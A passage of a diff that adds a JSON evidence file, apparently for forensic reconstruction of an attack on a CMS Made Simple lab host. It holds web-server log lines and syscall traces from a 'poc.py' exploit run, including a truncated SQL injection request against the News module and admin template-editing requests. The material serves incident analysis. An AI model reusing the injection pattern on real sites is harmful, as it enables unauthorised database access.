+        "accounts": [
+          "admin"
+        ],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0034",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:41:10 +0000] \"GET /admin/moduleinterface.php?mact=DesignManager%2Cm1_%2Cadmin_clearlocks%2C0&__c=30cea8cdf32246dcafa&m1_type=template HTTP/1.1\" 302 487 \"-\" \"python-requests/2.32.3\"",
+      "line": 1255,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025",
+          "/admin/moduleinterface.php"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025:19:41:10",
+          "/admin/moduleinterface.php"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [
+          "python"
+        ],
+        "accounts": [
+          "admin"
+        ],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0035",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:41:11 +0000] \"GET /admin/moduleinterface.php?mact=DesignManager%2Cm1_%2Cadmin_edit_template%2C0&__c=30cea8cdf32246dcafa&m1_tpl=10 HTTP/1.1\" 200 10614 \"-\" \"python-requests/2.32.3\"",
+      "line": 1257,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025",
+          "/admin/moduleinterface.php"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025:19:41:11",
+          "/admin/moduleinterface.php"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [
+          "python"
+        ],
+        "accounts": [
+          "admin"
+        ],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0036",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:41:11 +0000] \"POST /admin/moduleinterface.php HTTP/1.1\" 302 486 \"-\" \"python-requests/2.32.3\"",
+      "line": 1258,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025",
+          "/admin/moduleinterface.php"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025:19:41:11",
+          "/admin/moduleinterface.php"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [
+          "python"
+        ],
+        "accounts": [
+          "admin"
+        ],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0037",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:41:11 +0000] \"GET /index.php HTTP/1.1\" 200 5218 \"-\" \"python-requests/2.32.3\"",
+      "line": 1260,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025",
+          "/index.php"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025:19:41:11",
+          "/index.php"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0038",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:42:16 +0000] \"GET /index.php?page=how-cmsms-works HTTP/1.1\" 200 3493 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"",
+      "line": 1318,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025",
+          "/index.php"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025:19:42:16",
+          "/index.php"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0039",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:43:50 +0000] \"GET / HTTP/1.1\" 200 5223 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"",
+      "line": 1418,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025:19:43:50"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0040",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:44:41 +0000] \"GET / HTTP/1.1\" 200 5223 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"",
+      "line": 1462,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025:19:44:41"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0041",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:44:58 +0000] \"GET /index.php?page=how-cmsms-works HTTP/1.1\" 200 3494 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"",
+      "line": 1479,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025",
+          "/index.php"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025:19:44:58",
+          "/index.php"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0042",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:45:44 +0000] \"GET / HTTP/1.1\" 200 5223 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"",
+      "line": 1526,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025:19:45:44"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0043",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:46:18 +0000] \"GET /admin/moduleinterface.php?mact=DesignManager%2Cm1_%2Cadmin_clearlocks%2C0&__c=30cea8cdf32246dcafa&m1_type=template HTTP/1.1\" 302 487 \"-\" \"python-requests/2.32.3\"",
+      "line": 1552,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025",
+          "/admin/moduleinterface.php"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025:19:46:18",
+          "/admin/moduleinterface.php"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [
+          "python"
+        ],
+        "accounts": [
+          "admin"
+        ],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0044",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:46:20 +0000] \"GET /index.php HTTP/1.1\" 200 5212 \"-\" \"python-requests/2.32.3\"",
+      "line": 1562,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025",
+          "/index.php"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/2.32.3",
+          "/Jan/2025:19:46:20",
+          "/index.php"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0045",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:46:55 +0000] \"GET /index.php?page=where-do-i-get-help HTTP/1.1\" 200 3624 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"",
+      "line": 1591,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025",
+          "/index.php"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025:19:46:55",
+          "/index.php"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0046",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:47:52 +0000] \"GET /index.php?page=how-cmsms-works HTTP/1.1\" 200 3494 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"",
+      "line": 1648,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025",
+          "/index.php"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025:19:47:52",
+          "/index.php"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0047",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "192.168.123.2 - - [10/Jan/2025:19:48:01 +0000] \"GET / HTTP/1.1\" 200 5225 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"",
+      "line": 1655,
+      "timestamp": null,
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/5.0",
+          "/537.36",
+          "/56.0.2924.87",
+          "/Jan/2025:19:48:01"
+        ],
+        "ips": [
+          "192.168.123.2"
+        ],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": []
+      }
+    },
+    {
+      "evidence_id": "E0048",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.arg.data\": \"HTTP/1.1 200 OK..Date: Fri, 10 Jan 2025 19:38:38 GMT..Server: Apache/2.4.38 (Deb\", \"evt.category\": \"net\", \"evt.datetime\": \"2025-01-11 03:38:38.445278194\", \"evt.rawres\": 4671, \"evt.time\": \"03:38:38.445278194\", \"evt.type\": \"recvfrom\", \"fd.cip\": \"192.168.123.2\", \"fd.name\": \"192.168.123.2:42594->63.87.132.252:80\", \"fd.rip\": \"192.168.123.2\", \"fd.sip\": \"192.168.123.3\", \"fd.sport\": 80, \"fd.type\": \"ipv4\", \"proc.cmdline\": \"python poc.py 192.168.123.3 / ggg\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\"}",
+      "line": 948025,
+      "timestamp": "2025-01-11 03:38:38.445278194",
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/2.4.38",
+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/2.4.38",
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [
+          "192.168.123.2",
+          "192.168.123.3",
+          "63.87.132.252"
+        ],
+        "ports": [
+          "80"
+        ],
+        "files": [
+          "poc.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "recvfrom"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0049",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"net\", \"evt.datetime\": \"2025-01-11 03:38:38.551003965\", \"evt.rawres\": 0, \"evt.time\": \"03:38:38.551003965\", \"evt.type\": \"ioctl\", \"fd.cip\": \"192.168.123.2\", \"fd.name\": \"192.168.123.2:42616->63.87.132.252:80\", \"fd.rip\": \"192.168.123.2\", \"fd.sip\": \"192.168.123.3\", \"fd.sport\": 80, \"fd.type\": \"ipv4\", \"proc.cmdline\": \"python poc.py 192.168.123.3 / ggg\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\"}",
+      "line": 948042,
+      "timestamp": "2025-01-11 03:38:38.551003965",
+      "extracted_clues": {
+        "paths": [
+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [
+          "192.168.123.2",
+          "192.168.123.3",
+          "63.87.132.252"
+        ],
+        "ports": [
+          "80"
+        ],
+        "files": [
+          "poc.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "ioctl"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0050",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.arg.data\": \"HTTP/1.1 200 OK..Date: Fri, 10 Jan 2025 19:38:38 GMT..Server: Apache/2.4.38 (Deb\", \"evt.category\": \"net\", \"evt.datetime\": \"2025-01-11 03:38:38.799343813\", \"evt.rawres\": 4772, \"evt.time\": \"03:38:38.799343813\", \"evt.type\": \"recvfrom\", \"fd.cip\": \"192.168.123.2\", \"fd.name\": \"192.168.123.2:42622->63.87.132.252:80\", \"fd.rip\": \"192.168.123.2\", \"fd.sip\": \"192.168.123.3\", \"fd.sport\": 80, \"fd.type\": \"ipv4\", \"proc.cmdline\": \"python poc.py 192.168.123.3 / ggg\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\"}",
+      "line": 948052,
+      "timestamp": "2025-01-11 03:38:38.799343813",
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/2.4.38",
+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/2.4.38",
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [
+          "192.168.123.2",
+          "192.168.123.3",
+          "63.87.132.252"
+        ],
+        "ports": [
+          "80"
+        ],
+        "files": [
+          "poc.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "recvfrom"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0051",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"file\", \"evt.datetime\": \"2025-01-11 03:38:43.737008371\", \"evt.rawres\": -2, \"evt.time\": \"03:38:43.737008371\", \"evt.type\": \"newfstatat\", \"proc.cmdline\": \"python poc.py 192.168.123.3 / ggg\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\"}",
+      "line": 948294,
+      "timestamp": "2025-01-11 03:38:43.737008371",
+      "extracted_clues": {
+        "paths": [
+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [
+          "192.168.123.3"
+        ],
+        "ports": [],
+        "files": [
+          "poc.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "newfstatat"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0052",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"net\", \"evt.datetime\": \"2025-01-11 03:38:44.154065880\", \"evt.rawres\": 0, \"evt.time\": \"03:38:44.154065880\", \"evt.type\": \"connect\", \"fd.cip\": \"192.168.123.2\", \"fd.name\": \"192.168.123.2:51298->63.87.132.252:80\", \"fd.rip\": \"192.168.123.2\", \"fd.sip\": \"192.168.123.3\", \"fd.sport\": 80, \"fd.type\": \"ipv4\", \"proc.cmdline\": \"python poc.py 192.168.123.3 / ggg\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\"}",
+      "line": 948330,
+      "timestamp": "2025-01-11 03:38:44.154065880",
+      "extracted_clues": {
+        "paths": [
+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [
+          "192.168.123.2",
+          "192.168.123.3",
+          "63.87.132.252"
+        ],
+        "ports": [
+          "80"
+        ],
+        "files": [
+          "poc.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "connect"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0053",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"net\", \"evt.datetime\": \"2025-01-11 03:38:45.511467342\", \"evt.rawres\": 0, \"evt.time\": \"03:38:45.511467342\", \"evt.type\": \"ioctl\", \"fd.type\": \"ipv4\", \"proc.cmdline\": \"python poc.py 192.168.123.3 / ggg\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\"}",
+      "line": 948446,
+      "timestamp": "2025-01-11 03:38:45.511467342",
+      "extracted_clues": {
+        "paths": [
+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [
+          "192.168.123.3"
+        ],
+        "ports": [],
+        "files": [
+          "poc.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "ioctl"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0054",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"net\", \"evt.datetime\": \"2025-01-11 03:38:45.611582709\", \"evt.rawres\": 0, \"evt.time\": \"03:38:45.611582709\", \"evt.type\": \"connect\", \"fd.cip\": \"192.168.123.2\", \"fd.name\": \"192.168.123.2:51392->63.87.132.252:80\", \"fd.rip\": \"192.168.123.2\", \"fd.sip\": \"192.168.123.3\", \"fd.sport\": 80, \"fd.type\": \"ipv4\", \"proc.cmdline\": \"python poc.py 192.168.123.3 / ggg\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\"}",
+      "line": 948456,
+      "timestamp": "2025-01-11 03:38:45.611582709",
+      "extracted_clues": {
+        "paths": [
+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [
+          "192.168.123.2",
+          "192.168.123.3",
+          "63.87.132.252"
+        ],
+        "ports": [
+          "80"
+        ],
+        "files": [
+          "poc.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "connect"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0055",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"net\", \"evt.datetime\": \"2025-01-11 03:38:46.013726286\", \"evt.rawres\": 3, \"evt.time\": \"03:38:46.013726286\", \"evt.type\": \"socket\", \"fd.type\": \"ipv4\", \"proc.cmdline\": \"python poc.py 192.168.123.3 / ggg\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\"}",
+      "line": 948495,
+      "timestamp": "2025-01-11 03:38:46.013726286",
+      "extracted_clues": {
+        "paths": [
+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [
+          "192.168.123.3"
+        ],
+        "ports": [],
+        "files": [
+          "poc.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "socket"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0056",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"net\", \"evt.datetime\": \"2025-01-11 03:38:46.626020568\", \"evt.rawres\": 0, \"evt.time\": \"03:38:46.626020568\", \"evt.type\": \"close\", \"fd.cip\": \"192.168.123.2\", \"fd.name\": \"192.168.123.2:51448->63.87.132.252:80\", \"fd.rip\": \"192.168.123.2\", \"fd.sip\": \"192.168.123.3\", \"fd.sport\": 80, \"fd.type\": \"ipv4\", \"proc.cmdline\": \"python poc.py 192.168.123.3 / ggg\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\"}",
+      "line": 948535,
+      "timestamp": "2025-01-11 03:38:46.626020568",
+      "extracted_clues": {
+        "paths": [
+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [
+          "192.168.123.2",
+          "192.168.123.3",
+          "63.87.132.252"
+        ],
+        "ports": [
+          "80"
+        ],
+        "files": [
+          "poc.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "close"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0057",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.arg.data\": \"GET /moduleinterface.php?mact=News%2Cm1_%2Cdefault%2C0&m1_idlist=%2C1%29%29+and+\", \"evt.category\": \"net\", \"evt.datetime\": \"2025-01-11 03:38:46.627293519\", \"evt.rawres\": 336, \"evt.time\": \"03:38:46.627293519\", \"evt.type\": \"sendto\", \"fd.cip\": \"192.168.123.2\", \"fd.name\": \"192.168.123.2:51452->63.87.132.252:80\", \"fd.rip\": \"192.168.123.2\", \"fd.sip\": \"192.168.123.3\", \"fd.sport\": 80, \"fd.type\": \"ipv4\", \"proc.cmdline\": \"python poc.py 192.168.123.3 / ggg\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\"}",
+      "line": 948541,
+      "timestamp": "2025-01-11 03:38:46.627293519",
+      "extracted_clues": {
+        "paths": [
+          "/moduleinterface.php",
+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/moduleinterface.php",
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [
+          "192.168.123.2",
+          "192.168.123.3",
+          "63.87.132.252"
+        ],
+        "ports": [
+          "80"
+        ],
+        "files": [
+          "poc.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "sendto"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0058",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.arg.data\": \"HTTP/1.1 200 OK..Date: Fri, 10 Jan 2025 19:38:46 GMT..Server: Apache/2.4.38 (Deb\", \"evt.category\": \"net\", \"evt.datetime\": \"2025-01-11 03:38:46.836819714\", \"evt.rawres\": 4673, \"evt.time\": \"03:38:46.836819714\", \"evt.type\": \"recvfrom\", \"fd.cip\": \"192.168.123.2\", \"fd.name\": \"192.168.123.2:51460->63.87.132.252:80\", \"fd.rip\": \"192.168.123.2\", \"fd.sip\": \"192.168.123.3\", \"fd.sport\": 80, \"fd.type\": \"ipv4\", \"proc.cmdline\": \"python poc.py 192.168.123.3 / ggg\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\"}",
+      "line": 948552,
+      "timestamp": "2025-01-11 03:38:46.836819714",
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/2.4.38",
+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/2.4.38",
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [
+          "192.168.123.2",
+          "192.168.123.3",
+          "63.87.132.252"
+        ],
+        "ports": [
+          "80"
+        ],
+        "files": [
+          "poc.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "recvfrom"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0059",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"net\", \"evt.datetime\": \"2025-01-11 03:38:47.622644212\", \"evt.rawres\": 3, \"evt.time\": \"03:38:47.622644212\", \"evt.type\": \"socket\", \"fd.type\": \"ipv4\", \"proc.cmdline\": \"python poc.py 192.168.123.3 / ggg\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\"}",
+      "line": 948619,
+      "timestamp": "2025-01-11 03:38:47.622644212",
+      "extracted_clues": {
+        "paths": [
+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [
+          "192.168.123.3"
+        ],
+        "ports": [],
+        "files": [
+          "poc.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "socket"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0060",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"container.id\": \"b0e44c0a70c6\", \"evt.arg.data\": \"POST /admin/login.php HTTP/1.1..Host: 192.168.123.3..User-Agent: python-requests\", \"evt.arg.filename\": null, \"evt.arg.newpath\": null, \"evt.arg.oldpath\": null, \"evt.arg.pid\": null, \"evt.category\": \"net\", \"evt.datetime\": \"2025-01-11 03:38:48.421376867\", \"evt.is_io_read\": null, \"evt.is_io_write\": true, \"evt.num\": 6226572, \"evt.rawres\": 229, \"evt.time\": \"03:38:48.421376867\", \"evt.type\": \"sendto\", \"fd.cip\": \"192.168.123.2\", \"fd.cport\": 51574, \"fd.directory\": null, \"fd.ino\": 0, \"fd.is_server\": null, \"fd.lip\": \"63.87.132.252\", \"fd.name\": \"192.168.123.2:51574->63.87.132.252:80\", \"fd.num\": 3, \"fd.rip\": \"192.168.123.2\", \"fd.sip\": \"192.168.123.3\", \"fd.sport\": 80, \"fd.type\": \"ipv4\", \"proc.cmdline\": \"python poc.py 192.168.123.3 / ggg\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\", \"proc.pid\": 370254, \"proc.vpid\": 3 ...[truncated]",
+      "line": 948672,
+      "timestamp": "2025-01-11 03:38:48.421376867",
+      "extracted_clues": {
+        "paths": [
+          "/1.1..Host",
+          "/admin/login.php",
+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/1.1..Host:",
+          "/admin/login.php",
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [
+          "192.168.123.2",
+          "192.168.123.3",
+          "63.87.132.252"
+        ],
+        "ports": [
+          "80"
+        ],
+        "files": [
+          "poc.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [
+          "User",
+          "admin"
+        ],
+        "syscalls": [
+          "sendto"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0061",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"container.id\": \"b0e44c0a70c6\", \"evt.arg.data\": \"forgottenusername=test0&forgotpwform=1\", \"evt.arg.filename\": null, \"evt.arg.newpath\": null, \"evt.arg.oldpath\": null, \"evt.arg.pid\": null, \"evt.category\": \"net\", \"evt.datetime\": \"2025-01-11 03:38:48.421399658\", \"evt.is_io_read\": null, \"evt.is_io_write\": true, \"evt.num\": 6226581, \"evt.rawres\": 38, \"evt.time\": \"03:38:48.421399658\", \"evt.type\": \"sendto\", \"fd.cip\": \"192.168.123.2\", \"fd.cport\": 51574, \"fd.directory\": null, \"fd.ino\": 0, \"fd.is_server\": null, \"fd.lip\": \"63.87.132.252\", \"fd.name\": \"192.168.123.2:51574->63.87.132.252:80\", \"fd.num\": 3, \"fd.rip\": \"192.168.123.2\", \"fd.sip\": \"192.168.123.3\", \"fd.sport\": 80, \"fd.type\": \"ipv4\", \"proc.cmdline\": \"python poc.py 192.168.123.3 / ggg\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\", \"proc.pid\": 370254, \"proc.vpid\": 32, \"thread.tid\": 370254, \"thread.vtid\": 32}",
+      "line": 948673,
+      "timestamp": "2025-01-11 03:38:48.421399658",
+      "extracted_clues": {
+        "paths": [
